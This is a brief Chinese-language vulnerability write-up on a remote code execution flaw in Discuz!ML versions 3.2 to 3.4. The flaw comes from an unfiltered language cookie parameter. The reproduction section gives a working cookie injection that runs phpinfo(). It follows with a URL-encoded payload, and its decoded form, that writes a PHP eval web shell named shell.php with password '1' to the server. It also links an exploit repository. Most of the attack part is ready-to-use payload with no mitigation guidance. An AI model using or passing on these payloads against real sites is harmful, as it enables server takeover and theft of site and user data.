Discuz!ML 3.x 代码执行漏洞
==========================

一、漏洞简介
------------

漏洞类型：代码执行漏洞漏洞原因：Discuz!ML
系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。

二、影响范围
------------

-   Discuz!ML V3.2-3.4

三、复现过程
------------

cookie字段中会出现xxxx\_xxxx\_language字段，根本原因就是这个字段存在注入，导致的RCE抓包找到cookie的language的值修改为

    xxxx_xxxx_language=sc'.phpinfo().'

getshell

    %27.%2Bfile_put_contents%28%27shell.php%27%2Curldecode%28%27%253C%253Fphp%2520eval%2528%2524_POST%255B%25221%2522%255D%2529%253B%253F%253E%27%29%29.%27

实际为：

    '.+file_put_contents('shell.php',urldecode('<?php eval($_POST["1"]);?>')).'

即可在路径下生成shell.php，连接密码为1

https://github.com/ianxtianxt/discuz-ml-rce
-------------------------------------------
